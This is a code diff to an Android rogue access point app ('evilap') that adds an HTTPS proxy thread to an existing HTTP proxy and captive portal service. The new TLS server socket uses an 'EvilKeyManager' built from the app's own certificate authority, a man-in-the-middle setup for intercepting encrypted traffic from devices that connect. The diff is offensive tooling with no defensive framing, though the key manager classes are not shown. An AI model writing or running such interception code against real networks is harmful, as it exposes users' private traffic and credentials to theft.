@@ -3,19 +3,27 @@ package com.nibiru.evilap.proxy
 import android.app.Service
 import android.content.Intent
 import android.os.Binder
+import android.os.Build
 import android.os.IBinder
+import android.support.annotation.RequiresApi
 import android.util.Log
 import com.nibiru.evilap.EvilApApp
 import com.nibiru.evilap.EvilApService
 import com.nibiru.evilap.RxEventBus
+import com.nibiru.evilap.pki.EvilKeyManager
+import com.nibiru.evilap.pki.EvilSniMatcher
 import io.reactivex.disposables.Disposable
 import java.io.IOException
 import java.net.ServerSocket
+import javax.net.ssl.SSLContext
+import javax.net.ssl.SSLServerSocket
+import javax.net.ssl.SSLSocket
 
 class ProxyService : Service(){
     /**************************************CLASS FIELDS********************************************/
     protected val TAG = javaClass.simpleName
     private lateinit var  mSocketHTTP: ServerSocket
+    private lateinit var  mSocketHTTPS: ServerSocket
     private lateinit var  mSocketPortal: ServerSocket
     // This service is only bound from inside the same process and never uses IPC.
     internal inner class LocalBinder : Binder() {
@@ -26,20 +34,24 @@ class ProxyService : Service(){
     /**************************************CLASS METHODS*******************************************/
     override fun onBind(intent: Intent?): IBinder = mBinder
 
+    @RequiresApi(Build.VERSION_CODES.N)
     override fun onCreate() {
         Log.d(TAG, "onCreate()")
-        // Start up the thread running the servers.  Note that we create a separate thread because
+        // Spin up the threads running the servers.  Note that we create a separate thread because
         // the services normally runs in the process's main thread, which we don't want to block.
         try {
             mSocketHTTP = ServerSocket()
+            mSocketHTTPS = getEvilSSLSocket()
             mSocketPortal = ServerSocket()
-            //mSocketHTTPS = getSSLSocket(resources.openRawResource(R.raw.evil_ap))
         } catch (e: Exception) {
             e.printStackTrace()
         }
         //start the HTTP proxy socket thread
-        val proxyHTTP = Thread(MainLoopProxyHTTP(mSocketHTTP))
+        val proxyHTTP = Thread(MainLoopProxy(mSocketHTTP, EvilApApp.instance.PORT_PROXY_HTTP))
         proxyHTTP.start()
+        //start the HTTPS proxy socket thread
+        val proxyHTTPS = Thread(MainLoopProxy(mSocketHTTPS, EvilApApp.instance.PORT_PROXY_HTTPS))
+        proxyHTTPS.start()
         //start the captive portal thread
         val portal = Thread(MainLoopCaptivePortal(mSocketPortal))
         portal.start()
@@ -64,8 +76,9 @@ class ProxyService : Service(){
 
     private fun exit(){
         try {
-            Log.e(TAG,"Closing server socket!")
+            Log.e(TAG,"Closing server sockets!")
             mSocketHTTP.close()
+            mSocketHTTPS.close()
             mSocketPortal.close()
         } catch (e: IOException) {
             e.printStackTrace()
@@ -73,18 +86,17 @@ class ProxyService : Service(){
         stopSelf()
     }
 
-    /*
+    @RequiresApi(Build.VERSION_CODES.N)
     @Throws(Exception::class)
-    private fun getSSLSocket(keyStore: InputStream): SSLServerSocket {
-
-        val ks = KeyStore.getInstance("BKS") //Bouncy Castle Key Store
-        ks.load(keyStore, ksPass) //authenticate with keystore
-        val kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm())
-        kmf.init(ks, ctPass) //authenticate with certificate
+    private fun getEvilSSLSocket(): ServerSocket {
         val sc = SSLContext.getInstance("TLS")
-        sc.init(kmf.getKeyManagers(), null, null)
-        val ssf = sc.getServerSocketFactory()
-        return ssf.createServerSocket() as SSLServerSocket
-    }*/
+        // key manager[], trust manager[], SecureRandom generator
+        sc.init(arrayOf(EvilKeyManager(EvilApApp.instance.ca)), null, null)
+        //sc.init(null, null, null)
+        val ssf = sc.serverSocketFactory
+        val sock = ssf.createServerSocket() as SSLServerSocket
+        //sock.sslParameters.sniMatchers = listOf(EvilSniMatcher())
+        return sock
+    }
 
 }
